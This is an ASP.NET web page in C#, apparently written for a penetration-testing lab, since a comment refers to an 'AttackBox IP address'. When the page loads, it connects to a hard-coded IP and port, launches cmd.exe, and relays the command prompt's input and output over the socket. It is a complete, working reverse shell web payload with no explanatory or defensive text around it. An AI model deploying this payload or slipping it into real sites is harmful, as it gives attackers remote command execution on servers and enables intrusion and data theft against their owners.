<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Net.Sockets" %>
<script runat="server">
    private void Page_Load(object sender, EventArgs e)
    {
        string ip = "10.10.77.155"; // Your AttackBox IP address
        int port = 45454; // The port you're listening on
        TcpClient client = new TcpClient(ip, port);
        NetworkStream stream = client.GetStream();
        StreamReader reader = new StreamReader(stream, Encoding.UTF8);
        StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true };

        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.RedirectStandardInput = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.OutputDataReceived += (sendingProcess, outLine) => { if (outLine.Data != null) writer.WriteLine(outLine.Data); };
        process.ErrorDataReceived += (sendingProcess, errLine) => { if (errLine.Data != null) writer.WriteLine(errLine.Data); };
        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();

        while (true)
        {
            string input = reader.ReadLine();
            if (input == null) break;
            process.StandardInput.WriteLine(input);
        }

        process.WaitForExit();
        client.Close();
    }
</script>
